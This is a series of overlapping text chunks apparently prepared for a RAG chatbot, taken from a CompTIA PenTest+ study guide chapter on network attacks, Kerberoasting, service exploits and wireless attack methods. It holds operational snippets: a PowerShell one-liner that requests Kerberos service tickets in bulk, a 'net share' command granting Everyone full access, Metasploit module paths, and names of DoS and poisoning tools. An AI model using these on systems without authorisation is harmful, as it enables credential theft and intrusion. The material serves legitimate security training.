arbitrary or randomized MAC addresses. This makes it very easy to use a Kali system to try to defeat systems that rely on MAC addresses for part of their security controls. More complex systems will require additional work to access the network. If you want to read more about this topic, Ofir Arkin's 2006 paper on bypassing NAC provides a good overview despite its age: https://www.blackhat.com/presentations/bh-dc-07/Arkin/Paper/bh-dc07-Arkin-WP.pdf Segmentation Bypass Earlier in the chapter we explored the topic of VLAN hopping. Virtual local area networks (VLANs) separate broadcast domains into sections for security or performance reasons, and networks are logically broken into VLANs to create IP‐based broadcast domains that span multiple segments of the network. Many organizations use VLANs to create internal security boundaries between different systems or organizational units. This makes the ability to access a VLAN other than the one you are currently on an attractive opportunity for pentesters. What's more attractive is the ability to bypass segmentation. Segmentation is essentially the separation of portions of technology with controlled barriers. When considering network segmentation, the barriers are VLANs. The breakdown of networks logically and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	separate broadcast domains into sections for security or performance reasons, and networks are logically broken into VLANs to create IP‐based broadcast domains that span multiple segments of the network. Many organizations use VLANs to create internal security boundaries between different systems or organizational units. This makes the ability to access a VLAN other than the one you are currently on an attractive opportunity for pentesters. What's more attractive is the ability to bypass segmentation. Segmentation is essentially the separation of portions of technology with controlled barriers. When considering network segmentation, the barriers are VLANs. The breakdown of networks logically and controlled between switches and routers with access control and ACLs will provide a form of segmentation. Stricter forms of segmentation would be to break physical network segments into controlled areas locked down by firewall access between them. The underlying concept that is followed in every form of segmentation is the concept of zero trust. Controlling the traffic flowing from subnetwork to subnetwork, or zone to zone, allows for a higher level of security posture to be applied. Also, if one area is exploited, it may mean that it can be contained to that area and that area only. Segmentation bypass is bypassing the zero‐trust model, finding a way through the ACL, firewalls, or between VLANs, through zones, or any other form of control being used. Segmentation bypass can be caused by misconfiguration or if there is a security weakness that can be exploited in the system. It may be from the access and use of a jump server used to access only specific controlled areas you have created in your segmented network. DoS Attacks and Stress Testing For many penetration tests, the rules of engagement specifically prohibit intentional denial‐of‐service (DoS) attacks, particularly against production environments. That isn't always true, and some engagements will allow or even require DoS attacks, particularly if the client organization wants to fully understand their ability to weather them. There are three major types of DoS attacks: Application layer DoS attacks seek to crash a service or the entire server. Protocol‐based DoS attacks take advantage of a flaw in a protocol. A SYN flood is a classic example of a protocol‐based DoS attack. Traffic volume–based DoS attacks seek to overwhelm a target by sending more traffic than it can handle. Application layer DoS attacks are most likely to occur accidentally during a typical penetration test, particularly when attempting to exploit vulnerabilities in services or applications. These unintentional DoS conditions should be addressed in the rules of engagement and communications plans for a pentest, and they typically require immediate communication with a contact at the client organization if the test is conducted against a production environment. If a DoS attack is allowed in the test scope, pentesters have a number of tools at their disposal. In addition to commercial load testing and stress test services (sometimes called “stressers”), security testing tools like Hping and Metasploit can be used to create DoS conditions. Also note with DoS attacks,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	when attempting to exploit vulnerabilities in services or applications. These unintentional DoS conditions should be addressed in the rules of engagement and communications plans for a pentest, and they typically require immediate communication with a contact at the client organization if the test is conducted against a production environment. If a DoS attack is allowed in the test scope, pentesters have a number of tools at their disposal. In addition to commercial load testing and stress test services (sometimes called “stressers”), security testing tools like Hping and Metasploit can be used to create DoS conditions. Also note with DoS attacks, when it comes to cloud environments, attacks are not as effective these days due to the security mechanisms in place with cloud load balancers, which are able to absorb massive amounts of DoS traffic. Like most of the techniques we discuss in this book, Metasploit includes built‐in modules that allow DoS attacks. They include dozens of modules ranging from OS‐ and service‐specific tools to a general‐purpose SYN flood module. Figure 7.6 shows the /auxiliary/dos/tcp/synflood tool in use with rhost and rport set to a Metasploitable‐vulnerable machine's IP address and an HTTP service port. You can check the impact of this by running Wireshark (or tcpdump) to watch the SYN flood in process. FIGURE 7.6 Metasploit SYN flood Hping: A Packet‐Generation Swiss Army Knife The ability to generate arbitrary packets that meet the specific formatting or content needs of an exploit or attack is a crucial one for pentesters. You have already learned about Wireshark and Scapy as examples that allow for the capture or creation of packets on a network. Another tool that can be used for packet generation is Hping. Hping is a packet‐generation (or packet‐crafting) tool that supports raw IP packets, ICMP, UDP, TCP, and a wide range of packet manipulation tricks, including setting flags, splitting packets, and many others. Hping's full list of capabilities are in the Hping README file at https://github.com/antirez/hping, and the command‐line flags can all be found by typing hping ‐h on a system with Hping installed. Fortunately for pentesters, Hping3 is part of Kali Linux. In addition to the modules built into Metasploit, common DoS tools include HTTP Unbearable Load King (HULK), Low Orbit Ion Cannon (LOIC) and High Orbit Ion Cannon (HOIC), SlowLoris, and a variety of other tools. It is very important to verify that you have the correct target and permission before using tools like these against a client organization. Misconfigured Services The identification and exploitation of misconfigured services remains high on the list of vulnerabilities that pentesters find and report on. What exactly is a service? Services are generally any system‐based functionality that is provided when you install or use an operating system or any code or program that is used on hardware or otherwise. Services can range from simple in that they can be a lightweight tool and protocol like FTP, to more elaborate services such as Active Directory in Microsoft Windows. Now that you are reminded of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	permission before using tools like these against a client organization. Misconfigured Services The identification and exploitation of misconfigured services remains high on the list of vulnerabilities that pentesters find and report on. What exactly is a service? Services are generally any system‐based functionality that is provided when you install or use an operating system or any code or program that is used on hardware or otherwise. Services can range from simple in that they can be a lightweight tool and protocol like FTP, to more elaborate services such as Active Directory in Microsoft Windows. Now that you are reminded of what services are and how widely they are used in an infrastructure, the next step in hardening should be removing and/or shutting down services that you are not using. This doesn't necessarily constitute a “misconfigured” service, but you should be mindful of it nonetheless because it does offer the ability for an attacker to access systems, exploit vulnerabilities, and create issues. A misconfigured service is any service in use that is configured in a way that allows too much access or functionality or that is offering functionality you are not aware of. Another form of misconfiguration is one that loosens security, instead of applying the amount needed to do the job. An example is misconfiguring a router to use Telnet instead of SSH. The one simple misconfiguration can be overlooked and create a big vulnerability in your network and give an attacker the opportunity to exploit captured credentials. Later in this chapter, common Microsoft services exploitation will be covered. Share Enumeration Share enumeration is the exploitation of network‐based file‐sharing services. A share is generated when you configure a system folder to be available to others over the network. What you are configuring when you create a share is for others who can find it, gain access to it, and use it to retrieve data. Shares have been around and in use for decades. There is nothing new about this technology, and there is no shortage of its use. If anything, with the wide proliferation of data and the need to share it, sharing only becomes more critical a service to have available. Although you can basically share things across just about any operating system in use today, the most exploited system shares are those of Microsoft systems. Windows sharing will be further explained in this chapter when we cover NetBIOS and SMB, and how easily they are manipulated. Exploit Chaining At times a single exploit may not be sufficient to meet your pentesting goals. That's when exploit chaining comes into play. Exploit chaining is a term used to describe the use of multiple exploits to achieve a goal. An exploit chain might include exploiting a vulnerable service, then using a privilege escalation attack from a local service account. Those escalated privileges may be used to obtain credentials, which can then be used to access other systems or to conduct even more attacks or information gathering. In some cases, exploit chaining
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and SMB, and how easily they are manipulated. Exploit Chaining At times a single exploit may not be sufficient to meet your pentesting goals. That's when exploit chaining comes into play. Exploit chaining is a term used to describe the use of multiple exploits to achieve a goal. An exploit chain might include exploiting a vulnerable service, then using a privilege escalation attack from a local service account. Those escalated privileges may be used to obtain credentials, which can then be used to access other systems or to conduct even more attacks or information gathering. In some cases, exploit chaining may also be required to accomplish a single attack within a service or system. For the purposes of the exam, you'll need to know that exploits are often not run in a one‐off manner, and that instead you may use multiple exploits along the way. Exploiting Windows Services Windows remains the most popular desktop operating system in the world, and most businesses have a significant number of Windows servers, desktops, and laptops. That makes Windows a particularly attractive target. Fortunately for pentesters, many of the most commonly available Windows services are useful candidates for exploitation. There are quite a few tools available to exploit Windows services. For example, in Chapter 6, we covered using CrackMapExec (also known as CME), a tool that is often used in Microsoft Windows and with Active Directory Services (ADS). As you learned, it is a multipurpose AD tool that allows you to execute scripts, memory injection, enumeration, and dumping of credentials. Once you can access a Windows system, there are many ways to exploit it, and one of the most commonly exploited services is NetBIOS. NetBIOS Name Resolution Exploits One of the most commonly targeted services in a Windows network is NetBIOS. NetBIOS is commonly used for file sharing, but many other services rely on the protocol as well. NETBIOS Name Services and Attacks When Windows systems need to resolve the IP address for a hostname, they use three lookup methods in the following order: 1. The Local host file found at C:\Windows\System32\drivers\etc\hosts 2. DNS, first via local cache and then via the DNS server 3. The NetBIOS name service (NBNS), first via Link Local Multicast Name Resolution (LLMNR) queries and then via NetBIOS Name Service (NBT‐NS) queries At first, it seems like very few queries would make it past the first two options, but that isn't the case. Many, if not most, local networks do not have entries in DNS for local systems, particularly other workstations and network devices. Domain controllers or other important elements of infrastructure may resolve via DNS, but many Windows services will end up falling through to the NetBIOS name service. This means that targeting the NetBIOS name service can be a surprisingly effective attack, as shown in Figure 7.7. FIGURE 7.7 NetBIOS name service attack Windows sends broadcast queries to the local subnet's broadcast address via LLMNR and NetBIOS, which provides an opportunity for you to respond with a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that isn't the case. Many, if not most, local networks do not have entries in DNS for local systems, particularly other workstations and network devices. Domain controllers or other important elements of infrastructure may resolve via DNS, but many Windows services will end up falling through to the NetBIOS name service. This means that targeting the NetBIOS name service can be a surprisingly effective attack, as shown in Figure 7.7. FIGURE 7.7 NetBIOS name service attack Windows sends broadcast queries to the local subnet's broadcast address via LLMNR and NetBIOS, which provides an opportunity for you to respond with a spoofed response, redirecting traffic to a host of your choice. As a standalone exploit, this may not be particularly effective, but SMB spoofing using tools like Responder or Metasploit modules like /auxiliary/spoof/nbns/nbns_response and then pairing them with capture tools like Metasploit's /auxiliary/server/capture_smb for authentication hashes can be a powerful option in networks that support less secure hashing methods. You should memorize the ports used by NetBIOS and remember what service each port is used for, as listed in the accompanying table. Once you have captured hashes, you can then reuse the hashes for pass‐the‐ hash–style attacks. Doing so requires a bit more work, however, since hashes sent via SMB are salted using a challenge to prevent reuse. Metasploit and other tools that are designed to capture SMB hashes defeat this protection by sending a static challenge and allowing the use of rainbow tables to crack the password. Using Responder Responder is a powerful tool when exploiting NetBIOS and LLMNR responses. It can target individual systems or entire local networks, allowing you to analyze or respond to NetBIOS name services, LLMNR, and multicast DNS queries pretending to be the system that the query is intended for. Figure 7.8 shows Responder in its default mode running poisoners for each of those protocols, as well as multiple servers. Note the ability to provide executable downloads that include shells by serving EXE and HTML files. FIGURE 7.8 Responder sending poisoned answers Link Local Multicast Name Resolution (LLMNR) is the first service that a Windows system tries if it cannot resolve a host via DNS. LLMNR queries are sent via port 5535 as UDP traffic and use a multicast address of 224.0.0.252 for IPv4 traffic. Once Responder sees an authentication attempt, it will capture the hash, as shown in Figure 7.9. This is done automatically, allowing Responder to continue running in the background as you attempt other exploits or conduct further pentesting work. FIGURE 7.9 Responder capturing hashes If you'd like to learn more about how to use Responder, Not So Secure's “Pwning with Responder—A Pentester's Guide” provides a very approachable overview at https://www.notsosecure.com/pwning-withresponder-a-pentesters-guide. Once you have captured credentials, as shown in Figure 7.9, you can also use Responder to relay NTLM authentication to a target; then, if your attack is successful, you can execute code. After you have gained access to the remote system, Mimikatz functionality built into the Responder tool can be used
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	allowing Responder to continue running in the background as you attempt other exploits or conduct further pentesting work. FIGURE 7.9 Responder capturing hashes If you'd like to learn more about how to use Responder, Not So Secure's “Pwning with Responder—A Pentester's Guide” provides a very approachable overview at https://www.notsosecure.com/pwning-withresponder-a-pentesters-guide. Once you have captured credentials, as shown in Figure 7.9, you can also use Responder to relay NTLM authentication to a target; then, if your attack is successful, you can execute code. After you have gained access to the remote system, Mimikatz functionality built into the Responder tool can be used to gather more credentials and hashes, allowing you to pivot to other systems and services. Windows net Commands Exploring Windows domains can be a lot easier if you are familiar with the Windows net commands. Here are a few of the most useful commands: [net view /domain] Lists the hosts in the current domain. You can also use /domain: [domain name] to search a domain that the system has access to other than the current domain. net user /domain Lists the users in a domain. net accounts /domain Shows the domain password policy. net group /domain Lists groups on the domain. net group "Domain Admins" /domain Adding a group name like Domain Admins to the net group command lists users in the group, allowing discovery of domain admins. net share Shows current SMB shares. net session Used to review SMB sessions. Using the find command with this can allow searches for active sessions. net share [name of share] c:\directory\of\your\choice /GRANT:Everyone,FULL Grants access to a folder on the system for any user with full rights. As you would expect, this is easy to change by identifying specific users or permissions levels. Since the net commands are built into every Windows system you will encounter, knowing how to use them can be a powerful default tool when testing Windows targets. As you might expect, PowerShell provides even more powerful capabilities, but access is often more restricted, especially if you don't have administrative credentials. SMB Exploits The Server Message Block (SMB) implementation in Windows is another popular target for pentesters. Its vulnerabilities mean that unpatched systems can be exploited with relative ease; these include critical remote code execution vulnerabilities in the Windows SMB server discovered in 2017 (MS17‐010, also known as EternalBlue). Like most major exploits, Metasploit includes an SMB exploit module that targets the EternalBlue vulnerability. Identifying and Exploiting Common Services Although there are many services commonly found on networks, the PenTest+ exam specifically asks test‐takers to be familiar with SMB, SNMP, SMTP, FTP, and DNS exploits. You should make sure you know how to identify these services by typical service port and protocol and that you understand the most common ways of attacking each service. Real World Scenario Scenario Part 2: Exploiting an SMTP Server One of the servers you discovered on the MCDS network is a Linux shell host. MCDS's external documentation notes that this host is available for remote
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	targets the EternalBlue vulnerability. Identifying and Exploiting Common Services Although there are many services commonly found on networks, the PenTest+ exam specifically asks test‐takers to be familiar with SMB, SNMP, SMTP, FTP, and DNS exploits. You should make sure you know how to identify these services by typical service port and protocol and that you understand the most common ways of attacking each service. Real World Scenario Scenario Part 2: Exploiting an SMTP Server One of the servers you discovered on the MCDS network is a Linux shell host. MCDS's external documentation notes that this host is available for remote logins for many of its engineering staff as well as other employees. You don't have passwords or usernames for employees, and you want to gain access to the server. Unfortunately, your vulnerability scans don't indicate any vulnerable services. You did discover an SMTP server running on the same system. 1. How can you gather user IDs from the SMTP server? 2. What tool could you use to attempt a brute‐force SSH attack against the SSH server? Once you have working credentials, what would your next step be to gain further access to the system? Identifying and Attacking Service Targets Attacking services means that you'll need to identify those potential targets first. We've covered the most common tools elsewhere in the book, but the PenTest+ exam outline also specifically mentions them in relation to network attacks. Thus, as you're studying, think about how you would use the following tools as part of your network attack: Nmap will typically be used to identify open ports and services, providing an initial list of targets for further exploration. Nmap is often paired with vulnerability scanning tools to improve a pentester's chances of success by finding vulnerable services rather than simply identifying them, although Nmap itself can provide some useful data about service versions. The Nmap Scripting Engine (NSE) helps provide the same features as Nmap, but in an easy‐to‐use and highly flexible scripting format that helps you automate functions and script usage of the tool. Metasploit is a key tool in a pentester's toolkit. In addition to exploit tools, it builds in or integrates a wide variety of other components, including vulnerability scanning and port scanning. Metasploit's wide range of built‐in exploits and its broad use in the industry mean that you'll likely be able to find an existing exploit package for it or that new exploits will be released as Metasploit packages for many new vulnerabilities. Netcat's simplicity can belie how useful it is. It is often called a network Swiss army knife because it can be used for many purposes, ranging from port scanning to creating a reverse shell or standing up a custom service. Since the executable is very small, it can also be useful as a payload exploit. MSFVenom is an important tool that is part of the Metasploit Framework and was created to fuse two separate tools together: MSFPayload and MSFEncode. Used to generate payloads using various formats and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that new exploits will be released as Metasploit packages for many new vulnerabilities. Netcat's simplicity can belie how useful it is. It is often called a network Swiss army knife because it can be used for many purposes, ranging from port scanning to creating a reverse shell or standing up a custom service. Since the executable is very small, it can also be useful as a payload exploit. MSFVenom is an important tool that is part of the Metasploit Framework and was created to fuse two separate tools together: MSFPayload and MSFEncode. Used to generate payloads using various formats and encoders, MSFVenom helps to simplify their use into one tool. SNMP Exploits The Simple Network Management Protocol (SNMP) is commonly used to gather information about network devices, including configuration and status details. Although SNMP is most commonly associated with network devices like switches and routers, it is also used to monitor printers, servers, and a multitude of other networked systems. SNMP operates on UDP port 161, making it easy to recognize SNMP traffic on a network. SNMP organizes data into hierarchical structures called management information bases (MIBs). Each variable in an MIB is called an object identifier (OID). In addition, SNMP v1 and v2 rely on community strings to determine whether a connected user can read, read and write, or just send events known as “traps.” Since SNMP can provide a wealth of information about a network and specific devices on it, it can be an important target for a pentester. One of the first steps for SNMP exploitation is to map a network for devices with SNMP enabled. Though a port scan can help provide information about which systems are running SNMP services, more information can be gathered with dedicated tools. Kali Linux includes both snmpenum and snmpwalk for this purpose. Figure 7.10 shows the output of snmpwalk against a commodity home router; in fact, the output extends for pages, divulging much of the current configuration and status for the system. If the system was not using the community string of public or was properly configured with SNMP v3 settings, this would not have worked as easily! FIGURE 7.10 Output from snmpwalk Once you know which devices are running an SNMP daemon, you can query them. The goal for this round of SNMP queries is to determine the community strings that are configured, often starting with public. If the read community string can be determined, you can gather device information easily. In poorly configured environments, or when administrators have made a mistake, it may even be possible to obtain read/write capabilities via SNMP, allowing you to change device settings via SNMP. In most cases, however, SNMP attacks are primarily for information gathering rather than intended to compromise. SNMP You may encounter three major versions of SNMP on a network: SNMP v1 has poor security and should be largely deprecated. SNMP v2 provides added administrative functionality and added security, but the security features require configuration, are quite weak compared to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	read community string can be determined, you can gather device information easily. In poorly configured environments, or when administrators have made a mistake, it may even be possible to obtain read/write capabilities via SNMP, allowing you to change device settings via SNMP. In most cases, however, SNMP attacks are primarily for information gathering rather than intended to compromise. SNMP You may encounter three major versions of SNMP on a network: SNMP v1 has poor security and should be largely deprecated. SNMP v2 provides added administrative functionality and added security, but the security features require configuration, are quite weak compared to modern designs, and are often not used. SNMP v3 is functionally equivalent to SNMP v2 but includes additional security capabilities to provide confidentiality, integrity, and authentication. SMTP Exploits The Simple Mail Transfer Protocol (SMTP) is the protocol by which email is sent. SMTP operates on TCP port 25 and can typically be easily identified by Telnetting to the service port. Much like FTP, SMTP is a very old protocol without much built‐in security. That means it has been targeted for years, and most organizations that run SMTP servers have learned to harden them against misuse so that they do not get blacklisted for being spam email relays. That means the SMTP exploits that are most useful to a pentester are typically associated with a specific vulnerable SMTP server version. Thus, if you encounter an SMTP server, connecting to it and gathering banner information may provide enough of a clue to determine if it is a vulnerable service. SMTP servers can also be used for information gathering by connecting to them and using the EXPN and VRFY commands. To do this, simply Telnet to the SMTP server (telnet example.server.com25) and when connected, type VRFY [username] or EXPN [user_alias]. As you might guess, Metasploit includes an SMTP enumeration tool as part of its list of auxiliary scanners; auxiliary/scanner/smtp/smtp_enum will provide a list of users quickly and easily. SMTP servers can be useful if you have access to them from a trusted system or network. Sending email that appears to be from a trusted sender through a valid email server can make social engineering attacks more likely to succeed, even with an aware and alert group of end users at the target organization. Although probing SMTP servers may not seem terribly useful at first glance, this trust means that scanning for and testing SMTP servers can be useful. FTP Exploits File Transfer Protocol (FTP) has been around since 1971, and it remains a plaintext, unencrypted protocol that operates on TCP port 21 as well as higher ephemeral TCP ports for passive transfers. From that description, you might expect that it would have been completely replaced by now by secure services and HTTP‐based file transfers. Fortunately for pentesters, that isn't always the case, and FTP servers remain in use around the world. Alternatives to unencrypted FTP include SFTP (SSH File Transfer Protocol) and FTPS (FTP Secure), which are both secure file transfer methods. SFTP
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	SMTP servers can be useful. FTP Exploits File Transfer Protocol (FTP) has been around since 1971, and it remains a plaintext, unencrypted protocol that operates on TCP port 21 as well as higher ephemeral TCP ports for passive transfers. From that description, you might expect that it would have been completely replaced by now by secure services and HTTP‐based file transfers. Fortunately for pentesters, that isn't always the case, and FTP servers remain in use around the world. Alternatives to unencrypted FTP include SFTP (SSH File Transfer Protocol) and FTPS (FTP Secure), which are both secure file transfer methods. SFTP transfers files via SSH on TCP port 22, whereas FTPS extends FTP itself to use Transport Layer Security (TLS) and uses TCP ports 21 and 990. Exploiting FTP is quite simple if you can gain access to FTP network traffic. Since the protocol is unencrypted, the simplest attack is to capture usernames and passwords on the wire and use them to log into the target system or other target systems. FTP servers themselves may also be vulnerable. Critical vulnerabilities in many major FTP servers have been discovered over time, and since FTP is an increasingly forgotten service, administrators may not have paid attention to FTP services they run. FTP has historically been built into many embedded devices, including network devices, printers, and other similar machines. Embedded FTP services are often difficult, if not impossible, to update and may also be forgotten, creating an opportunity for attack. A final avenue for FTP service exploitation is via the configuration of the FTP service itself. Poorly or improperly configured FTP servers may allow navigation outside their own base directories. This makes exploring the directory structure that is exposed by an FTP server useful once you have usable credentials. Since many FTP servers historically supported a public login, you may even be able to navigate some of the directory structure without specific credentials being required. Those publicly accessible directories can sometimes be treasure troves of organizational data. Years ago, one of the authors of this book discovered an FTP server during a security assessment that had what he considered the worst‐case misconfiguration of an FTP server. It was configured to share the root directory of the server it was on, allowing attackers to navigate to and download almost any file on the system or to upload files to sensitive directories—possibly allowing attackers to cause the system to run files of their choosing! Kerberoasting Service accounts are accounts that exist to run services rather than to allow users to log in. They can be a powerful tool for pentesters. Because service account passwords often don't expire, compromising a service account can provide long‐term access to a system. Kerberoasting is a technique that relies on requesting service tickets for service account service principal names (SPNs). The tickets are encrypted with the password of the service account associated with the SPN, meaning that once you have extracted the service tickets using a tool like Mimikatz, you can
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the system to run files of their choosing! Kerberoasting Service accounts are accounts that exist to run services rather than to allow users to log in. They can be a powerful tool for pentesters. Because service account passwords often don't expire, compromising a service account can provide long‐term access to a system. Kerberoasting is a technique that relies on requesting service tickets for service account service principal names (SPNs). The tickets are encrypted with the password of the service account associated with the SPN, meaning that once you have extracted the service tickets using a tool like Mimikatz, you can crack the tickets to obtain the service account password using offline cracking tools. The Kerberoasting toolkit is found at https://github.com/nidem/kerberoast. Kerberoasting is most effective against shorter, less complex passwords, as it relies on offline cracking, which can be slow when service accounts use long passwords. Kerberoasting is a four‐step process: 1. Scan Active Directory for user accounts with service principal names (SPNs) set. 2. Request service tickets using the SPNs. 3. Extract the service tickets from memory and save to a file. 4. Conduct an offline brute‐force attack against the passwords in the service tickets. If you want to read more about Kerberoasting, there are a number of excellent tutorials that cover it in depth with multiple techniques, including methods that use Empire and Impacket. We found the following write‐ups to be particularly useful: https://blog.stealthbits.com/extracting-service-account-passwords-withkerberoasting https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz https://room362.com/post/2016/kerberoast-pt1 The technical process to do this requires you to retrieve SPN values. You can use the PowerSploit Get‐NetUser command, PowerShell commands to gather the list of accounts, or the Kerberoast toolkit. With SPNs in hand, you can request service tickets via PowerShell. To pull all of the tickets, the code is quite simple: PS C:\> Add-Type -AssemblyName System.IdentityModel PS C:\> setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } The code to do this is part of the Kerberoast tools and can be found in the README at GitHub. Ticket extraction is easily done using the kerberos::list/export command in Mimikatz. Once you have tickets, you're almost ready to crack them, but first you need to convert the tickets to a crackable format. That's where kirbi2john.py comes in. Once you have run it, you can then crack the tickets using John the Ripper or other cracking tools. If you have acquired the NTLM hash for a service account, you can use Mimikatz to create a forged Kerberos service ticket, or “silver ticket.” That ticket can then be used to gain further access to services. Samba Exploits Much like the Microsoft implementation of SMB, the Linux Samba server has proven to have a variety of security flaws. The SambaCry exploit of 2017 was discovered to allow remote code execution in all SMB versions newer than Samba 3.5.0—a 2010 code release! Because Samba and Microsoft SMB operate on the same ports and protocols, fingerprinting the operating system before attempting an exploit is important to ensure that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	for a service account, you can use Mimikatz to create a forged Kerberos service ticket, or “silver ticket.” That ticket can then be used to gain further access to services. Samba Exploits Much like the Microsoft implementation of SMB, the Linux Samba server has proven to have a variety of security flaws. The SambaCry exploit of 2017 was discovered to allow remote code execution in all SMB versions newer than Samba 3.5.0—a 2010 code release! Because Samba and Microsoft SMB operate on the same ports and protocols, fingerprinting the operating system before attempting an exploit is important to ensure that you are using the right exploit for the OS and server service. Metasploitable 2 includes a vulnerable SMB server you can use to practice SMB exploits. SSH Exploits Secure Shell (SSH) is used for secure command‐line access to systems, typically via TCP port 22, and is found on devices and systems of all types. Because SSH is so common, attacking systems that provide an SSH service is a very attractive option for a pentester. This also means that most organizations will patch SSH quickly if they are able to. Unfortunately for many organizations, SSH is embedded in devices of all descriptions, and updating SSH throughout their infrastructure may be difficult. Thus, pentesters should validate both SSH and operating system versions when reviewing vulnerability scan results to determine if a vulnerable version of SSH is running. Another method of attacking services like SSH is to use a brute‐forcing tool like THC Hydra (or an equivalent Metasploit module). Hydra is a brute‐ forcing tool that can crack systems using password guessing. In the example shown in Figure 7.11, Hydra is run against a Metasploitable system's root account using the rockyou password list that Kali includes by default. Note the ‐t flag, setting the number of parallel threads for the target. By default, Hydra uses 16, but this example uses 4. FIGURE 7.11 THC Hydra SSH brute‐force attack Once you have credentials, additional Metasploit modules like the ssh_login and ssh_login_pubkey modules can allow you to test them across an entire network range or list of possible target systems. Password Attacks Password attacks aren't only conducted across a network, but in many cases pentesters will start with network‐based password attacks to gain a foothold. There are four major types of password attacks that you should be familiar with for the exam: Brute‐force attacks attempt to log in using passwords using an algorithm to keep trying new passwords. Although brute force may apply some basic rules, there isn't much subtlety about this type of attack, and it can take a very long time unless the password or passwords are simple and reached early in the attempt's process. Brute‐ force attacks are also one of the easiest to detect since systems can look for repeated login attempts and changes in the attempted passwords that indicate a brute‐force attempt is underway. Dictionary attacks bring a bit more intelligence than brute‐force attacks and use a prebuilt dictionary of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to log in using passwords using an algorithm to keep trying new passwords. Although brute force may apply some basic rules, there isn't much subtlety about this type of attack, and it can take a very long time unless the password or passwords are simple and reached early in the attempt's process. Brute‐ force attacks are also one of the easiest to detect since systems can look for repeated login attempts and changes in the attempted passwords that indicate a brute‐force attempt is underway. Dictionary attacks bring a bit more intelligence than brute‐force attacks and use a prebuilt dictionary of possible passwords along with rules on how that dictionary can be used and modified. In organizations that might have a common set of thematic words, or if you want to leverage the lists of common passwords that already exist, this type of attack can sometimes be more successful than a brute‐force attack. Hash cracking attacks rely on using tools that can identify passwords based on a captured hash. Hashes may be acquired using a password dump tool, from a breach, or via the network. One powerful tool used for hash cracking is the use of rainbow tables, which are pregenerated databases of common hashes using expected password character sets and lengths. Looking up a hash and finding out what string results in that hash is a much faster means of cracking a hash than the other common option: simple brute force. Password spraying uses the same password against multiple systems, servers, or sites, then moves on to the next password in a list. Password spraying attacks are commonly associated with breached passwords, which may be used against accounts for individuals across multiple targets but can also be used with password dictionaries and lists. The password attack you will choose will depend on whether you have or can obtain information like hashes or previously captured passwords, or if you are starting without any existing information. You'll also want to consider the likelihood of detection and how you can avoid detection while conducting password attacks when deciding which technique to use. Stress Testing for Availability Stress testing, sometimes called load testing, may be included in penetration tests to help determine if the targeted systems and services can survive a potential denial‐of‐service scenario. Kali Linux includes a variety of stress testing tools (under Vulnerability Analysis – Stress Testing), and those tools include HTTP, SSL, VoIP, and other stress‐testing capabilities. When you consider stress testing as part of penetration test, it is worth revisiting the scope and process with your client. Stress testing can result in system or service outages and may also fill log files or create other unwanted disruptions. Since outages can be problematic and costly, pentesters who will conduct a stress test or other test that is likely to create a denial‐of‐service condition often work out notification processes with their client that allow them to ask for the test to be monitored and stopped if issues occur. Of course, if stress
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	SSL, VoIP, and other stress‐testing capabilities. When you consider stress testing as part of penetration test, it is worth revisiting the scope and process with your client. Stress testing can result in system or service outages and may also fill log files or create other unwanted disruptions. Since outages can be problematic and costly, pentesters who will conduct a stress test or other test that is likely to create a denial‐of‐service condition often work out notification processes with their client that allow them to ask for the test to be monitored and stopped if issues occur. Of course, if stress testing is part of a zero‐knowledge engagement or an engagement that more closely resembles an actual attacker, this type of prior notice may not be feasible. Wireless Exploits Wireless and wired networks share many of the same functions, protocols, and behaviors, but there are a number of attack methods that are specifically used for wireless networks, access points, and wireless clients. These attacks focus on the way that wireless devices connect to networks, how they authenticate, and other features and capabilities specific to wireless networks. Attack Methods When you consider how to conduct a wireless exploit, you must think about what attack methods are best suited to your needs and which you may be able to accomplish. Those answers may change during the course of a penetration test as you gain additional access, information, or discover new vulnerabilities. The PenTest+ exam requires you to be familiar with the basics of the following attack methods: Wardriving is the term given to the attack method on wireless systems from a moving vehicle. It comes from the older “war dialing” attack used to expose modems that would answer if you called banks of phone numbers in search of a vulnerability. Wardriving does the same with wireless systems and, when conducted properly, will show you open SSIDs that may allow you to connect without any protection or passwords required. Evil twin attack is an attack that allows a hacker to quickly (and easily) set up free online access via an SSID and captive portal. This can be done by creating a secondary (twin) of an exposed SSID, thus creating the “evil twin” for unsuspecting users to connect to and use. Once connected, the attacker can see everything the users do online. Protocol fuzzing is an attack that uses testing sequences on software to find deficiencies within it. This allows exploitation to take place when large amounts of inputs are sent to a system in order to crash or debilitate it. Packet crafting is an attack where a fake packet is created to bypass controls or be used to exploit a system. Captive portal is an attack that allows you to believe that you are attaching to a legitimate system in order to gain access, when in reality it is set up to trick you into thinking it is legitimate, but it is not. This leads to other attacks once connected to the portal. Wi‐Fi
